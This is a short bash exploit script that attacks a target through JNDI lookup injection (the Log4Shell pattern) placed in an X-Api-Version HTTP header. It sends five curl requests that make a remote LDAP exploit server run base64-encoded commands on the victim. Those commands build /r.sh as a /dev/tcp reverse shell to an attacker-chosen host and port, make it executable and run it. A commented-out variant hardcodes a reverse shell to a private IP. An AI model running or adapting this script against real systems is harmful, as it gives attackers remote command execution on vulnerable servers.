#!/bin/bash

if [[ "$#" -lt 3 ]]
then
	echo "Usage: $0 <VICTIM> <EXPLOIT_SERVER> <REVERS_HOST>"
	echo "example: $0 192.168.0.100:8080 192.168.0.100:1389 192.168.0.100:5555"
	exit 1
fi

VICTIM=$1
EXPLOIT_SERVER=$2
REVERS_HOST=$( echo $3 | cut -f1 -d: )
REVERS_PORT=$( echo $3 | cut -f2 -d: )


#PAYLOAD=$( echo 'echo  "bash -i >& /dev/tcp/192.168.15.107/5555 0>&1" > /r.sh' | base64)
#curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"


# Create /r.sh with /dev/tcp revers shell
# 3 requests due to problems with parsing and payload size - yes i know - it's lame - 31336 :(

PAYLOAD=$( echo 'echo -en "bash -i >& /dev/tcp" > /r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

PAYLOAD=$( echo "echo -en /${REVERS_HOST}/${REVERS_PORT} >> /r.sh" | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

PAYLOAD=$( echo 'echo -en " 0>&1\n\n" >> /r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"


# chmod +x /r.sh
PAYLOAD=$( echo 'chmod +x /r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

# run revers shell
PAYLOAD=$( echo 'bash /r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

